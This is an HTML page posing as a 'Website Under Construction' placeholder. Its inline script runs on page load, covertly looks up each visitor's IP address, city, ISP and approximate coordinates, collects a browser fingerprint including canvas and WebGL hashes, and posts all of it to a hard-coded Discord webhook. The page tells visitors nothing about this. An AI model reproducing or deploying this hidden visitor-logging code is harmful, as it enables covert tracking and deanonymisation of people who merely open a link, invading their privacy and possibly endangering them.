<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Under Construction</title>
  <style>
    body {
      margin: 0; padding: 0; background: #ffffff; color: #222;
      font-family: Arial, Helvetica, sans-serif;
      height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center;
    }
    .container { max-width: 400px; }
    h1 { font-size: 34px; margin-bottom: 16px; }
    p { font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Website Under Construction</h1>
    <p>We're working on something big.<br>Come back later.</p>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";

    async function getFingerprint() {
      const fp = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(", ") : "Unknown",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        touchPoints: navigator.maxTouchPoints || 0,
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
        isMobile: /Mobi|Android/i.test(navigator.userAgent)
      };

      // Canvas Fingerprint
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "alphabetic";
        ctx.font = "14px Arial";
        ctx.fillText("Fingerprint Test", 2, 20);
        fp.canvasHash = btoa(canvas.toDataURL());
      } catch (e) { fp.canvasHash = "Blocked"; }

      // WebGL Fingerprint
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown";
          fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
        }
      } catch (e) { fp.webglVendor = "Blocked"; }

      return fp;
    }

    async function sendVisitorInfo() {
      console.log("🚀 Collecting visitor data...");

      let geo = { lat: null, lon: null };
      let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };

      // IP + Geolocation (multiple services)
      const services = [
        'https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon',
        'https://ipapi.co/json/',
        'https://freeipapi.com/api/json/'
      ];

      for (let url of services) {
        try {
          const res = await fetch(url);
          if (res.ok) {
            const data = await res.json();
            ipInfo.ip = data.query || data.ip || "Unknown";
            ipInfo.city = data.city || "Unknown";
            ipInfo.region = data.regionName || data.region || "Unknown";
            ipInfo.country = data.country || data.country_name || "Unknown";
            ipInfo.isp = data.isp || data.org || "Unknown";
            if (data.lat) geo.lat = data.lat;
            if (data.lon) geo.lon = data.lon;
            break;
          }
        } catch (e) {}
      }

      const fingerprint = await getFingerprint();

      const locationStr = geo.lat 
        ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)} (IP-based)` 
        : "Unknown";

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: "**New Visitor Detected**",
            embeds: [{
              title: "Visitor Information",
              color: 0x3498db,
              fields: [
                { name: "IP Address", value: ipInfo.ip, inline: true },
                { name: "City", value: ipInfo.city, inline: true },
                { name: "Region", value: ipInfo.region, inline: true },
                { name: "Country", value: ipInfo.country, inline: true },
                { name: "Approx Coordinates", value: locationStr, inline: false },
                { name: "ISP", value: ipInfo.isp, inline: false },
                { name: "Device / Browser", value: fingerprint.userAgent.substring(0, 200) + "...", inline: false },
                { name: "Platform", value: fingerprint.platform, inline: true },
                { name: "Is Mobile", value: fingerprint.isMobile ? "Yes" : "No", inline: true },
                { name: "Screen", value: fingerprint.screen, inline: true },
                { name: "Timezone", value: fingerprint.timezone, inline: true },
                { name: "Languages", value: fingerprint.languages, inline: false },
                { name: "Canvas Fingerprint", value: fingerprint.canvasHash ? fingerprint.canvasHash.substring(0, 60) + "..." : "N/A", inline: false }
              ]
            }]
          })
        });
        console.log("✅ Data sent to Discord");
      } catch (e) {
        console.error("Webhook error");
      }
    }

    window.onload = () => setTimeout(sendVisitorInfo, 1000);
  </script>
</body>
</html>
